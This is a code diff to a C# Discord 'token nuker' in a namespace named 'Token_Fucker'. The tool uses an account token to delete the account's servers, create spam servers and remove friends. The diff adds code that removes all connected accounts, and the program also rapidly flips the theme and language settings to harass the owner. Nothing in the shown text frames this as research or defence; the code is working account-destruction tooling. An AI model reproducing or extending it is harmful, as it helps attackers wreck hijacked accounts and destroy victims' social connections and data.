@@ -63,7 +63,8 @@ namespace Token_Fucker
                     {
                         client.DeleteGuild(guildids.Id);
                         Console.WriteLine("Deleted Guild " + guildids.Id);
-                    } catch (Exception ex)
+                    }
+                    catch (Exception ex)
                     {
                         Console.WriteLine("Could not delete a guild, possibly cuz of 2FA Error: " + ex);
                     }
@@ -75,7 +76,7 @@ namespace Token_Fucker
                 webClient.DownloadFile("https://gblobscdn.gitbook.com/spaces%2F-M9yNp3uGfRW04W_P6dE%2Favatar-1592659338854.png", "anarchy.png");
             for (int amount = 0; amount < 3; amount++)
             {
-                client.CreateGuild(guildname, (DiscordImage) Image.FromFile("anarchy.png"), "europe");
+                client.CreateGuild(guildname, (DiscordImage)Image.FromFile("anarchy.png"), "europe");
                 Console.WriteLine("Created a guild.");
             }
 
@@ -87,6 +88,13 @@ namespace Token_Fucker
                 Console.WriteLine("Removed relationship with ID " + friendids.User.Id);
             }
 
+            // Remove all connections.
+            var connections = client.GetConnectedAccounts();
+            foreach (var connectionlist in connections)
+            {
+                client.RemoveConnectedAccount(connectionlist.Type, connectionlist.Id);
+                Console.WriteLine("Removed connection " + connectionlist.Type + " with the id of" + connectionlist.Id + ".");
+            }
 
             // Spam switch through dark and white mode, and rapidly change the language of the user's account.
             Console.WriteLine("Rapidly changing through dark and white mode, and random languages.");
@@ -95,7 +103,7 @@ namespace Token_Fucker
                 try
                 {
                     var values = Enum.GetValues(typeof(DiscordLanguage)).Cast<DiscordLanguage>();
-                    foreach(var value in values)
+                    foreach (var value in values)
                     {
                         client.User.ChangeSettings(new UserSettingsProperties
                         {
@@ -108,7 +116,8 @@ namespace Token_Fucker
                             Language = value
                         });
                     }
-                } catch (Exception ex)
+                }
+                catch (Exception ex)
                 {
                     Console.WriteLine("Error: " + ex);
                 }
